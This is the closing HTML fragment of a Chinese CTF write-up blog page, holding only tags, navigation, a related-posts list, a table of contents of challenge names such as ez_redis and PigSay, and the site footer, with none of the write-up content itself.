href="/tags/gopher%E5%8D%8F%E8%AE%AE/">gopher协议</a><a class="post-meta__tags" href="/tags/xss/">xss</a><a class="post-meta__tags" href="/tags/redis/">redis</a><a class="post-meta__tags" href="/tags/tarfile/">tarfile</a><a class="post-meta__tags" href="/tags/litestar/">litestar</a></div><div class="post-share"><div class="social-share" data-image="/img/ltx.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related  no-desc" href="/2025/07/10/Java%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" title="Java基础知识"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Java基础知识</div></div></div></a><a class="pagination-related  no-desc" href="/2025/07/13/20250713%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/" title="20250713随缘刷题"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">20250713随缘刷题</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related no-desc" href="/2025/07/09/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B%E5%A4%8D%E7%8E%B0/" title="2024春秋杯冬季赛复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-09</div><div class="info-item-2">2024春秋杯冬季赛复现</div></div></div></a><a class="pagination-related no-desc" href="/2025/04/04/XYCTF2025/" title="XYCTF2025"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-04</div><div class="info-item-2">XYCTF2025</div></div></div></a><a class="pagination-related no-desc" href="/2025/08/29/TFCCTF-2025/" title="TFCCTF-2025"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-29</div><div class="info-item-2">TFCCTF-2025</div></div></div></a><a class="pagination-related no-desc" href="/2025/07/06/20250706%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/" title="20250706随缘刷题"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-06</div><div class="info-item-2">20250706随缘刷题</div></div></div></a><a class="pagination-related no-desc" href="/2025/06/26/2025%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E4%BA%91%E5%A4%8D%E7%9B%98/" title="2025长城杯决赛部分题目云复盘"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-26</div><div class="info-item-2">2025长城杯决赛部分题目云复盘</div></div></div></a><a class="pagination-related no-desc" href="/2025/05/08/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="python反序列化"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-08</div><div class="info-item-2">python反序列化</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/ltx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">cheng_xing</div><div class="author-info-description">web菜鸡修炼中</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">57</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">147</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/sakuraraindrop"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/sakuraraindrop" target="_blank" title="Github"><i class="fab fa-github" style="color: #hdhfbb;"></i></a><a class="social-icon" href="https://space.bilibili.com/504596197" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #000000;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AD%E7%9A%AE%E7%9A%84%E8%AE%A1%E7%AE%97%E5%99%A8"><span class="toc-number">1.</span> <span class="toc-text">臭皮的计算器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AD%E7%9A%AE%E8%B8%A9%E8%B8%A9%E8%83%8C"><span class="toc-number">2.</span> <span class="toc-text">臭皮踩踩背</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#chocolate"><span class="toc-number">3.</span> <span class="toc-text">chocolate</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezpollute"><span class="toc-number">4.</span> <span class="toc-text">ezpollute</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E7%9A%84%E5%AF%86%E7%A0%81"><span class="toc-number">5.</span> <span class="toc-text">隐藏的密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezcmsss"><span class="toc-number">6.</span> <span class="toc-text">ezcmsss</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PangBai-%E8%BF%87%E5%AE%B6%E5%AE%B6%EF%BC%884%EF%BC%89"><span class="toc-number">7.</span> <span class="toc-text">PangBai 过家家（4）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PangBai-%E8%BF%87%E5%AE%B6%E5%AE%B6%EF%BC%885%EF%BC%89"><span class="toc-number">8.</span> <span class="toc-text">PangBai 过家家（5）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AD%E7%9A%AE%E7%9A%84%E7%BD%91%E7%AB%99"><span class="toc-number">9.</span> <span class="toc-text">臭皮的网站</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-redis"><span class="toc-number">10.</span> <span class="toc-text">ez_redis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jinjaclub"><span class="toc-number">11.</span> <span class="toc-text">jinjaclub</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PigSay"><span class="toc-number">12.</span> <span class="toc-text">PigSay</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E7%BB%84%E6%88%90"><span class="toc-number">12.1.</span> <span class="toc-text">题目组成</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">12.2.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%8D%E7%9C%8B%E7%9C%8B%E4%B8%80%E4%BD%8D%E5%A4%96%E5%9B%BD%E8%80%81%E5%93%A5%E7%9A%84%E8%A7%A3%E6%B3%95"><span class="toc-number">12.3.</span> <span class="toc-text">再看看一位外国老哥的解法</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/27/20250927%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/" title="20250927随缘刷题">20250927随缘刷题</a><time datetime="2025-09-27T04:45:15.000Z" title="发表于 2025-09-27 12:45:15">2025-09-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/19/20250919%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/" title="20250919随缘刷题">20250919随缘刷题</a><time datetime="2025-09-19T14:11:53.000Z" title="发表于 2025-09-19 22:11:53">2025-09-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/16/20250916%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0/" title="20250916论文学习">20250916论文学习</a><time datetime="2025-09-16T07:49:01.000Z" title="发表于 2025-09-16 15:49:01">2025-09-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/08/%E6%B9%BE%E5%8C%BA%E6%9D%AF2025/" title="湾区杯2025">湾区杯2025</a><time datetime="2025-09-08T00:47:34.000Z" title="发表于 2025-09-08 08:47:34">2025-09-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/06/ImaginaryCTF2025/" title="ImaginaryCTF2025">ImaginaryCTF2025</a><time datetime="2025-09-06T07:03:31.000Z" title="发表于 2025-09-06 15:03:31">2025-09-06</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/hk.jpg);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By cheng_xing</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>